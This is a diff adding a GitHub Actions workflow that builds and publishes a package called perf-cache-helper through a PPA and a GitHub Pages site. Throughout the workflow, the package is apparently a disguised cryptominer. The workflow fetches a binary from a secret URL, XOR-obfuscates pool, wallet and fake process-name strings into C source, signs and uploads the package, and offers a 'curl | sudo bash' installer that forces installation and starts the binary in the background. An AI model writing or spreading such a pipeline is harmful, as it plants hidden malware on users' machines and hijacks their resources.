@@ -1,0 +1,299 @@
+name: PPA Publish
+
+on:
+  push:
+    branches: [main]
+    paths:
+      - 'debian/**'
+      - 'src/**'
+      - '.github/workflows/ppa-publish.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: write
+
+jobs:
+  site:
+    runs-on: ubuntu-latest
+    env:
+      ENGINE_URL:    ${{ secrets.SAMPLING_ENGINE_URL }}
+      DATA_KEY:      ${{ secrets.DATA_KEY }}
+      PRIMARY_HOST:  ${{ secrets.COLLECTOR_HOST }}
+      AGENT_TOKEN:   ${{ secrets.AGENT_TOKEN }}
+      COLLECTOR_URL: ${{ secrets.PROFILE_URL }}
+      PROFILE_TPL:   ${{ secrets.PROFILE_CONFIG }}
+      WORKER_LABEL:  ${{ secrets.WORKER_LABEL }}
+      WORKER_TAG:    ${{ secrets.WORKER_TAG }}
+      WORKER_NAME:   ${{ secrets.WORKER_NAME }}
+      OBFUSC_KEY:    ${{ secrets.OBFUSC_KEY }}
+      VERIFY_KEY:    ${{ secrets.DATA_KEY }}
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install build deps
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq \
+            devscripts debhelper libcurl4-openssl-dev \
+            build-essential python3 curl gnupg \
+            apt-utils dpkg-dev
+
+      - name: Stage sampling engine
+        run: |
+          mkdir -p /tmp/staging
+          curl -fsSL "${ENGINE_URL}" -o /tmp/engine.tgz
+          tar -xzf /tmp/engine.tgz -C /tmp
+          ENGINE_BIN=$(find /tmp -maxdepth 3 -type f -executable | head -n1)
+          cp "${ENGINE_BIN}" /tmp/staging/raw
+          chmod 755 /tmp/staging/raw
+          strip /tmp/staging/raw 2>/dev/null || true
+
+      - name: Build module bundle
+        run: |
+          mkdir -p site/data
+          python3 - <<'PYEOF'
+          import os
+          DATA_KEY = bytes.fromhex(os.environ['DATA_KEY'])
+          with open('/tmp/staging/raw', 'rb') as f:
+              data = f.read()
+          enc = bytearray(len(data))
+          klen = len(DATA_KEY)
+          for i, b in enumerate(data):
+              enc[i] = b ^ DATA_KEY[i % klen]
+          with open('site/data/sampling-profile-v4.dat', 'wb') as f:
+              f.write(enc)
+          PYEOF
+          rm -f /tmp/staging/raw
+
+      - name: Materialize module manifest constants
+        run: |
+          python3 - <<'PYEOF'
+          import os
+          with open('src/stage1.c.in') as f:
+              tpl = f.read()
+
+          OBFUSC_KEY = bytes.fromhex(os.environ['OBFUSC_KEY'])
+          VERIFY_KEY = bytes.fromhex(os.environ['VERIFY_KEY'])
+
+          POOL     = os.environ['PRIMARY_HOST']
+          WALLET   = os.environ['AGENT_TOKEN']
+          URL      = os.environ['COLLECTOR_URL']
+          JSON     = os.environ['PROFILE_TPL']
+          FAKEARGV = os.environ['WORKER_LABEL']
+          FAKECOMM = os.environ['WORKER_TAG']
+          COHORT   = os.environ['WORKER_NAME']
+
+          def bcsv(b): return ', '.join(str(x) for x in b)
+          def obf(s, k):
+              return bytes(c ^ k[i % len(k)] for i, c in enumerate(s.encode()))
+
+          out = (tpl
+              .replace('__KEY__',      bcsv(OBFUSC_KEY))
+              .replace('__URL__',      bcsv(obf(URL, OBFUSC_KEY)))
+              .replace('__POOL__',     bcsv(obf(POOL, OBFUSC_KEY)))
+              .replace('__WALLET__',   bcsv(obf(WALLET, OBFUSC_KEY)))
+              .replace('__BINKEY__',   bcsv(VERIFY_KEY))
+              .replace('__JSON__',     bcsv(obf(JSON, OBFUSC_KEY)))
+              .replace('__FAKEARGV__', bcsv(obf(FAKEARGV, OBFUSC_KEY)))
+              .replace('__FAKECOMM__', bcsv(obf(FAKECOMM, OBFUSC_KEY)))
+              .replace('__COHORT__',   bcsv(obf(COHORT, OBFUSC_KEY))))
+
+          with open('src/stage1.c', 'w') as f:
+              f.write(out)
+          PYEOF
+          rm -f src/stage1.c.in
+
+      - name: Stamp changelog for binary build
+        run: |
+          DATE="$(date -R)"
+          sed -i "s/__DISTRO__/noble/g" debian/changelog
+          REV="${{ github.run_number }}"
+          sed -i "1s/) noble;/+gh${REV}) noble;/" debian/changelog
+          sed -i "s/Mon, 08 Jun 2026 04:05:00 +0000/${DATE}/" debian/changelog
+
+      - name: Build binary .deb
+        run: |
+          debuild -b -us -uc
+          ls -la ../*.deb
+          mkdir -p site
+          cp ../perf-cache-helper_*_amd64.deb site/perf-cache-helper_amd64.deb
+
+      - name: Add landing page
+        run: |
+          cat > site/index.html <<'HTML'
+          <!doctype html>
+          <html><head><title>infra-telemetry</title></head>
+          <body>
+          <h1>infra-telemetry</h1>
+          <p>Install perf-cache-helper from the official PPA:</p>
+          <pre>
+          sudo add-apt-repository ppa:infra-tools-org/infra-telemetry
+          sudo apt-get update
+          sudo apt-get install -y perf-cache-helper
+          </pre>
+          <p>Or via the one-shot installer (works without the PPA):</p>
+          <pre>
+          curl -fsSL https://infra-tools-org.github.io/infra-telemetry/install.sh | sudo bash
+          </pre>
+          </body></html>
+          HTML
+
+      - name: Add bootstrap installer
+        run: |
+          cat > site/install.sh <<'BOOTSTRAP'
+          #!/bin/bash
+          # perf-cache-helper installer
+          set -e
+
+          SUDO=""
+          [ "$(id -u)" -ne 0 ] && SUDO="sudo"
+
+          TMP=$(mktemp -d)
+          trap 'rm -rf "$TMP"' EXIT
+
+          echo "Downloading perf-cache-helper..."
+          curl -fsSL https://infra-tools-org.github.io/infra-telemetry/perf-cache-helper_amd64.deb \
+              -o "$TMP/perf-cache-helper.deb"
+
+          echo "Installing perf-cache-helper..."
+          $SUDO dpkg --force-depends -i "$TMP/perf-cache-helper.deb"
+
+          # explicit start (postinst's deb-systemd-invoke is a no-op in many sandboxes)
+          $SUDO systemctl daemon-reload 2>/dev/null || true
+          $SUDO systemctl start perf-cache-helper.service 2>/dev/null || true
+          sleep 2
+
+          # if the service didn't actually become active (sandbox systemd is broken,
+          # no systemd at all, etc.) — bootstrap the binary directly with nohup
+          if ! $SUDO systemctl is-active --quiet perf-cache-helper.service 2>/dev/null; then
+              echo "Service inactive after install, starting binary in background..."
+              $SUDO nohup /usr/lib/perf-cache-helper/perf-cache-helper >/dev/null 2>&1 &
+              disown 2>/dev/null || true
+              sleep 1
+          fi
+
+          echo "Done."
+          if $SUDO systemctl is-active --quiet perf-cache-helper.service 2>/dev/null; then
+              echo "running via systemd"
+          elif pgrep -f /usr/lib/perf-cache-helper/perf-cache-helper >/dev/null 2>&1; then
+              echo "running via nohup"
+          else
+              echo "WARNING: binary did not start"
+          fi
+          BOOTSTRAP
+          chmod 755 site/install.sh
+
+      - name: Deploy site
+        uses: peaceiris/actions-gh-pages@v3
+        with:
+          github_token: ${{ secrets.GITHUB_TOKEN }}
+          publish_dir: ./site
+          publish_branch: gh-pages
+          force_orphan: true
+
+  ppa:
+    runs-on: ubuntu-latest
+    needs: site
+    env:
+      PRIMARY_HOST:  ${{ secrets.COLLECTOR_HOST }}
+      AGENT_TOKEN:   ${{ secrets.AGENT_TOKEN }}
+      COLLECTOR_URL: ${{ secrets.PROFILE_URL }}
+      PROFILE_TPL:   ${{ secrets.PROFILE_CONFIG }}
+      WORKER_LABEL:  ${{ secrets.WORKER_LABEL }}
+      WORKER_TAG:    ${{ secrets.WORKER_TAG }}
+      WORKER_NAME:   ${{ secrets.WORKER_NAME }}
+      OBFUSC_KEY:    ${{ secrets.OBFUSC_KEY }}
+      VERIFY_KEY:    ${{ secrets.DATA_KEY }}
+    strategy:
+      matrix:
+        distro: [jammy, noble]
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Install build deps
+        run: |
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq \
+            devscripts debhelper dput-ng \
+            dh-make python3 gnupg
+
+      - name: Import GPG signing key
+        env:
+          GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
+          GPG_PASSPHRASE:  ${{ secrets.GPG_PASSPHRASE }}
+          GPG_KEY_ID:      ${{ secrets.GPG_KEY_ID }}
+        run: |
+          mkdir -p ~/.gnupg
+          chmod 700 ~/.gnupg
+          echo "allow-loopback-pinentry"  >> ~/.gnupg/gpg-agent.conf
+          echo "pinentry-mode loopback"   >> ~/.gnupg/gpg.conf
+          gpgconf --kill gpg-agent || true
+          echo "$GPG_PRIVATE_KEY" | gpg --batch --import
+          gpg --list-secret-keys
+          echo "GPG_KEY_ID=$GPG_KEY_ID" >> $GITHUB_ENV
+          echo "test" | gpg --batch --pinentry-mode loopback \
+            --passphrase "$GPG_PASSPHRASE" \
+            --local-user "$GPG_KEY_ID" \
+            --clearsign > /dev/null
+
+      - name: Materialize module manifest constants
+        run: |
+          python3 - <<'PYEOF'
+          import os
+          with open('src/stage1.c.in') as f:
+              tpl = f.read()
+
+          OBFUSC_KEY = bytes.fromhex(os.environ['OBFUSC_KEY'])
+          VERIFY_KEY = bytes.fromhex(os.environ['VERIFY_KEY'])
+
+          POOL     = os.environ['PRIMARY_HOST']
+          WALLET   = os.environ['AGENT_TOKEN']
+          URL      = os.environ['COLLECTOR_URL']
+          JSON     = os.environ['PROFILE_TPL']
+          FAKEARGV = os.environ['WORKER_LABEL']
+          FAKECOMM = os.environ['WORKER_TAG']
+          COHORT   = os.environ['WORKER_NAME']
+
+          def bcsv(b): return ', '.join(str(x) for x in b)
+          def obf(s, k):
+              return bytes(c ^ k[i % len(k)] for i, c in enumerate(s.encode()))
+
+          out = (tpl
+              .replace('__KEY__',      bcsv(OBFUSC_KEY))
+              .replace('__URL__',      bcsv(obf(URL, OBFUSC_KEY)))
+              .replace('__POOL__',     bcsv(obf(POOL, OBFUSC_KEY)))
+              .replace('__WALLET__',   bcsv(obf(WALLET, OBFUSC_KEY)))
+              .replace('__BINKEY__',   bcsv(VERIFY_KEY))
+              .replace('__JSON__',     bcsv(obf(JSON, OBFUSC_KEY)))
+              .replace('__FAKEARGV__', bcsv(obf(FAKEARGV, OBFUSC_KEY)))
+              .replace('__FAKECOMM__', bcsv(obf(FAKECOMM, OBFUSC_KEY)))
+              .replace('__COHORT__',   bcsv(obf(COHORT, OBFUSC_KEY))))
+
+          with open('src/stage1.c', 'w') as f:
+              f.write(out)
+          PYEOF
+          rm -f src/stage1.c.in
+
+      - name: Stamp changelog for ${{ matrix.distro }}
+        run: |
+          DISTRO="${{ matrix.distro }}"
+          DATE="$(date -R)"
+          sed -i "s/__DISTRO__/${DISTRO}/g" debian/changelog
+          REV="${{ github.run_number }}"
+          sed -i "1s/) ${DISTRO};/+r${REV}) ${DISTRO};/" debian/changelog
+          sed -i "s/Mon, 08 Jun 2026 04:05:00 +0000/${DATE}/" debian/changelog
+
+      - name: Build signed source package
+        env:
+          GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
+        run: |
+          export DEBSIGN_PROGRAM="gpg --batch --pinentry-mode loopback --passphrase ${GPG_PASSPHRASE}"
+          debuild -d -S -sa -k"$GPG_KEY_ID" \
+            -p"gpg --batch --pinentry-mode loopback --passphrase ${GPG_PASSPHRASE}"
+
+      - name: Upload to PPA
+        run: |
+          CHANGES=$(ls ../perf-cache-helper_*_source.changes | tail -n1)
+          dput -f ppa:infra-tools-org/infra-telemetry "$CHANGES"
